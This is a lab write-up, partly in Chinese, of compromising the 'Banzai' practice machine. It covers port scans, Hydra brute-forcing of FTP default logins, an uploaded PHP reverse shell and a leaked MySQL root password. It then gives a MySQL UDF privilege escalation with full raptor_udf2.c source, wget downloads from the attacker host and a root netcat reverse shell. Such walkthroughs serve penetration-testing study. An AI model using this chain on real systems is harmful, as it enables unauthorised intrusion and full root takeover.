## Nmap

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Banzai]
└─$ sudo nmap -A -sV -sS -T4 192.168.187.56
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-21 22:07 CST
Nmap scan report for 192.168.187.56
Host is up (0.28s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
8080/tcp open   http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 3.16 (92%), Linux 4.4 (92%), Linux 3.13 (90%), Linux 3.2 - 3.8 (88%), WatchGuard Fireware 11.8 (88%), IPFire 2.11 firewall (Linux 2.6.32) (87%), Linux 4.9 (87%), Linux 3.10 - 3.16 (87%), Linux 3.10 - 3.12 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT       ADDRESS
1   284.26 ms 192.168.45.1
2   284.20 ms 192.168.45.254
3   284.34 ms 192.168.251.1
4   284.41 ms 192.168.187.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.71 seconds
```

改用另一種 nmap 方式掃描

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Banzai]
└─$ sudo nmap -p- -n -vvv 192.168.187.56
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-21 22:31 CST
Initiating Ping Scan at 22:31
Scanning 192.168.187.56 [4 ports]
Completed Ping Scan at 22:31, 0.33s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:31
Scanning 192.168.187.56 [65535 ports]
Discovered open port 25/tcp on 192.168.187.56
Discovered open port 22/tcp on 192.168.187.56
Discovered open port 8080/tcp on 192.168.187.56
Discovered open port 21/tcp on 192.168.187.56
SYN Stealth Scan Timing: About 4.77% done; ETC: 22:42 (0:10:19 remaining)
SYN Stealth Scan Timing: About 13.62% done; ETC: 22:39 (0:06:27 remaining)
SYN Stealth Scan Timing: About 21.38% done; ETC: 22:40 (0:06:52 remaining)
SYN Stealth Scan Timing: About 34.15% done; ETC: 22:41 (0:06:24 remaining)
SYN Stealth Scan Timing: About 40.92% done; ETC: 22:40 (0:05:31 remaining)
SYN Stealth Scan Timing: About 47.02% done; ETC: 22:41 (0:05:02 remaining)
Discovered open port 8295/tcp on 192.168.187.56
SYN Stealth Scan Timing: About 54.15% done; ETC: 22:40 (0:04:12 remaining)
Discovered open port 5432/tcp on 192.168.187.56
SYN Stealth Scan Timing: About 61.36% done; ETC: 22:40 (0:03:27 remaining)
SYN Stealth Scan Timing: About 67.35% done; ETC: 22:40 (0:02:54 remaining)
SYN Stealth Scan Timing: About 74.03% done; ETC: 22:40 (0:02:16 remaining)
SYN Stealth Scan Timing: About 81.11% done; ETC: 22:40 (0:01:37 remaining)
SYN Stealth Scan Timing: About 88.12% done; ETC: 22:40 (0:01:00 remaining)
SYN Stealth Scan Timing: About 93.45% done; ETC: 22:40 (0:00:34 remaining)
Completed SYN Stealth Scan at 22:40, 520.30s elapsed (65535 total ports)
Nmap scan report for 192.168.187.56
Host is up, received echo-reply ttl 61 (0.28s latency).
Scanned at 2023-08-21 22:31:32 CST for 521s
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE  SERVICE    REASON
20/tcp   closed ftp-data   reset ttl 61
21/tcp   open   ftp        syn-ack ttl 61
22/tcp   open   ssh        syn-ack ttl 61
25/tcp   open   smtp       syn-ack ttl 61
5432/tcp open   postgresql syn-ack ttl 61
8080/tcp open   http-proxy syn-ack ttl 61
8295/tcp open   unknown    syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 520.75 seconds
           Raw packets sent: 131393 (5.781MB) | Rcvd: 544 (64.452KB)
```

發現 8295 port 也有開

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Banzai]
└─$ sudo nmap -A -sV -sC 192.168.187.56 -p 20,21,22,25,5432,8080,8295
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-21 22:45 CST
Nmap scan report for 192.168.187.56
Host is up (0.28s latency).

PORT     STATE  SERVICE    VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp        vsftpd 3.0.3
22/tcp   open   ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open   smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
5432/tcp open   postgresql PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
8080/tcp open   http       Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
8295/tcp open   http       Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
Aggressive OS guesses: Linux 3.11 - 4.1 (93%), Linux 4.4 (93%), Linux 3.16 (92%), Linux 3.13 (90%), Linux 3.10 - 3.16 (88%), Linux 3.10 - 3.12 (88%), Linux 2.6.32 (88%), Linux 3.2 - 3.8 (88%), Linux 3.8 (88%), WatchGuard Fireware 11.8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 20/tcp)
HOP RTT       ADDRESS
1   281.38 ms 192.168.45.1
2   281.66 ms 192.168.45.254
3   281.75 ms 192.168.251.1
4   283.76 ms 192.168.187.56

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.52 seconds
```

並無後續發現，嘗試爆破 ftp 帳密

```json
┌──(ouyang㉿kali)-[~/tools/nikto/program]
└─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.187.56 ftp -f
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-21 22:53:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.187.56:21/
[21][ftp] host: 192.168.187.56   login: admin   password: admin
[STATUS] attack finished for 192.168.187.56 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-21 22:53:11
```

成功得到 admin/admin (ftp 記得調為 passive)

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Banzai]
└─$ ftp 192.168.187.56
Connected to 192.168.187.56.
220 (vsFTPd 3.0.3)
Name (192.168.187.56:ouyang): admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> LIST
?Invalid command.
ftp> HELP
?Invalid command.
ftp> help
Commands may be abbreviated.  Commands are:

!		delete		hash		mlsd		pdir		remopts		struct
$		dir		help		mlst		pls		rename		sunique
account		disconnect	idle		mode		pmlsd		reset		system
append		edit		image		modtime		preserve	restart		tenex
ascii		epsv		lcd		more		progress	rhelp		throttle
bell		epsv4		less		mput		prompt		rmdir		trace
binary		epsv6		lpage		mreget		proxy		rstatus		type
bye		exit		lpwd		msend		put		runique		umask
case		features	ls		newer		pwd		send		unset
cd		fget		macdef		nlist		quit		sendport	usage
cdup		form		mdelete		nmap		quote		set		user
chmod		ftp		mdir		ntrans		rate		site		verbose
close		gate		mget		open		rcvbuf		size		xferbuf
cr		get		mkdir		page		recv		sndbuf		?
debug		glob		mls		passive		reget		status
ftp> !ls
192.168.187.56
ftp> ls
229 Entering Extended Passive Mode (|||44148|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
```

且透過 ls 內容可判斷目前在 8295 web service 的根目錄，

因為有 web service，嘗試上傳 web reverse shell，port 需改成靶機有開的 port，不然會被擋住

```json
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |********************************************************************************|  5496      111.51 MiB/s    00:00 ETA
226 Transfer complete.
5496 bytes sent in 00:00 (9.07 KiB/s)
```

接著透過 web 執行

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Banzai]
└─$ nc -nvlp 8295
listening on [any] 8295 ...
connect to [192.168.45.181] from (UNKNOWN) [192.168.187.56] 49692
Linux banzai 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux
 11:13:31 up  1:10,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

	重連 VPN，IP 換成 192.168.214.56

```json
╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r--  1 admin root 23364 May 27  2020 index.php
-rw-r--r-- 1 admin root 135 May 26  2020 /var/www/config.php
drwxr-xr-x  2 admin root  4096 May 26  2020 contactform
drwxr-xr-x  2 admin root  4096 May 26  2020 css
drwxr-xr-x  2 admin root  4096 May 26  2020 js
drwxr-xr-x  3 admin root  4096 Aug 22 10:13 img
drwxr-xr-x 11 admin root  4096 May 26  2020 lib
total 44
```

發現有 /var/www/config.php，查看檔案內容

```json
www-data@banzai:/tmp$ cat /var/www/config.php
cat /var/www/config.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```

找到一組 db 帳密

```json
root / EscalateRaftHubris123
```

在 reverse shell 中嘗試連到 DB，使用 psql 失敗，改用 mysql 可成功登入 (nmap 可能誤判)

```json
www-data@banzai:/tmp$ psql -h localhost -d main -U root
psql -h localhost -d main -U root
Password for user root: EscalateRaftHubris123

psql: FATAL:  password authentication failed for user "root"
FATAL:  password authentication failed for user "root"
www-data@banzai:/tmp$ mysql -u root -p
mysql -u root -p
Enter password: EscalateRaftHubris123

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 5
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.00 sec)
```

沒看到可利用的 table，嘗試找是否有提權漏洞

```json
mysql> select version();
select version();
+-----------+
| version() |
+-----------+
| 5.7.30    |
+-----------+
1 row in set (0.00 sec)

mysql> status
status
--------------
mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper

Connection id:		5
Current database:
Current user:		root@localhost
SSL:			Not in use
Current pager:		stdout
Using outfile:		''
Using delimiter:	;
Server version:		5.7.30 MySQL Community Server (GPL)
Protocol version:	10
Connection:		Localhost via UNIX socket
Server characterset:	latin1
Db     characterset:	latin1
Client characterset:	latin1
Conn.  characterset:	latin1
UNIX socket:		/var/run/mysqld/mysqld.sock
Uptime:			19 days 13 hours 24 min 49 sec

Threads: 1  Questions: 9  Slow queries: 0  Opens: 105  Flush tables: 1  Open tables: 98  Queries per second avg: 0.000
--------------
```

發現版本是 5.7.30，嘗試利用 [exploit db](https://www.exploit-db.com/exploits/50236) 但失敗

以下為 writeup，透過 MySQL UDF 提權

### Escalation via MySQL User Defined Function

We can take advantage of this serious misconfiguration to escalate our privilege from `www-data` to `root` via user defined database functions (UDFs), specifically **raptor_udf2.c**.

```
#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
        unsigned int arg_count; // number of arguments
        enum Item_result *arg_type; // pointer to item_result
        char **args; // pointer to arguments
        unsigned long *lengths; // length of string args
        char *maybe_null; // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
        char maybe_null; // 1 if func can return NULL
        unsigned int decimals; // for real functions
        unsigned long max_length; // for string functions
        char *ptr; // free ptr for func data
        char const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
        if (args->arg_count != 1) {
                return(0);
        }
        system(args->args[0]);
        return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
        return(0);
}
```

Let's start a web server on our attack machine.

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8295
Serving HTTP on 0.0.0.0 port 8295 (http://0.0.0.0:8295/) ...
```

Next, we'll download the UDF source code to the target.

```
www-data@banzai:/var/www$ wget http://192.168.49.246:8295/raptor_udf2.c -O /var/www/raptor_udf2.c
<49.246:8295/raptor_udf2.c -O /var/www/raptor_udf2.c
--2020-12-21 23:54:25--  http://192.168.49.246:8295/raptor_udf2.c
Connecting to 192.168.49.246:8295... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1029 (1.0K) [text/x-csrc]
Saving to: '/var/www/raptor_udf2.c'

/var/www/raptor_udf 100%[===================>]   1.00K  --.-KB/s    in 0s      

2020-12-21 23:54:25 (309 MB/s) - '/var/www/raptor_udf2.c' saved [1029/1029]

www-data@banzai:/var/www$ ls
ls
config.php  html  raptor_udf2.c
www-data@banzai:/var/www$ 
```

We'll compile the source code in two steps as indicated in the comments.

```
www-data@banzai:/var/www$ gcc -g -c raptor_udf2.c
gcc -g -c raptor_udf2.c
www-data@banzai:/var/www$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
<,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
www-data@banzai:/var/www$ ls -lah
ls -lah
total 40K
drwxr-xr-x  3 www-data root     4.0K Dec 21 23:55 .
drwxr-xr-x 12 root     root     4.0K Jun  4  2020 ..
-rw-r--r--  1 admin    root      135 May 26  2020 config.php
drwxr-xr-x  7 admin    root     4.0K Dec 21 23:38 html
-rw-rw-rw-  1 www-data www-data 1.1K Dec 21 23:52 raptor_udf2.c
-rw-rw-rw-  1 www-data www-data 7.2K Dec 21 23:55 raptor_udf2.o
-rwxrwxrwx  1 www-data www-data  11K Dec 21 23:55 raptor_udf2.so
www-data@banzai:/var/www$ 
```

Now, we'll connect to the MySQL database from our low-privilege shell with the recovered credentials and then switch to the `mysql` database.

```
www-data@banzai:/var/www$ mysql -u root -p
mysql -u root -p
Enter password: EscalateRaftHubris123

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.30 MySQL Community Server (GPL)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use mysql;
use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> 
```

The first step in this process is to discover where this installation of MySQL stores its UDFs. In this case, the directory is **/usr/lib/mysql/plugin/**. We'll use this directory name in the steps that follow.

```
mysql> show variables like 'plugin_dir';
show variables like 'plugin_dir';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)

mysql> 
```

We must also determine whether the database has been misconfigured to allow insecure handling of files.

```
mysql> SHOW VARIABLES LIKE "secure_file_priv";
SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.00 sec)

mysql> 
```

At this point, all elements are in place to exploit this misconfiguration and obtain a root shell.

```
mysql> create table foo(line blob);
create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/var/www/raptor_udf2.so'));
insert into foo values(load_file('/var/www/raptor_udf2.so'));
Query OK, 1 row affected (0.01 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select * from mysql.func;
select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> 
```

If everything went according to plan, the `do_system` function based on our malicious UDF will grant us root-level command execution. To check this, we can run the `id` command and redirect the output to a file we can read:

```
mysql> select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');
+----------------------------------------------------------------------+
| do_system('id > /var/www/out; chown www-data.www-data /var/www/out') |
+----------------------------------------------------------------------+
|                                                                    0 |
+----------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> \! sh          
\! sh
$ cat /var/www/out
cat /var/www/out
uid=0(root) gid=114(mysql) groups=114(mysql)
$ exit
exit
mysql> 
```

The command did indeed execute with the highest privileges. To obtain a reverse shell, we can download [our copy of the Netcat binary](https://github.com/H74N/netcat-binaries/blob/master/nc) to the target and then run it as root. We'll continue utilizing our running python web server on port 8295.

```
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8295
Serving HTTP on 0.0.0.0 port 8295 (http://0.0.0.0:8295/) ...

```

Let's download the Netcat binary and make it executable.

```
mysql> select do_system('wget http://192.168.49.246:8295/nc -O /var/www/nc');
select do_system('wget http://192.168.49.246:8295/nc -O /var/www/nc');
+----------------------------------------------------------------+
| do_system('wget http://192.168.49.246:8295/nc -O /var/www/nc') |
+----------------------------------------------------------------+
|                                                              0 |
+----------------------------------------------------------------+
1 row in set (4.94 sec)

mysql> select do_system('chmod 777 /var/www/nc');
select do_system('chmod 777 /var/www/nc');
+------------------------------------+
| do_system('chmod 777 /var/www/nc') |
+------------------------------------+
|                                  0 |
+------------------------------------+
1 row in set (0.00 sec)
mysql> 
```

Finally, we can start our Netcat listener on port 8295 and execute the following command:

```
mymysql> select do_system('/var/www/nc 192.168.49.246 8295 -e /bin/bash');
select do_system('/var/www/nc 192.168.49.246 8295 -e /bin/bash');

```

We have caught our root shell!

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nlvp 8295                                  
listening on [any] 8295 ...
connect to [192.168.49.246] from (UNKNOWN) [192.168.246.56] 49898
whoami
root
```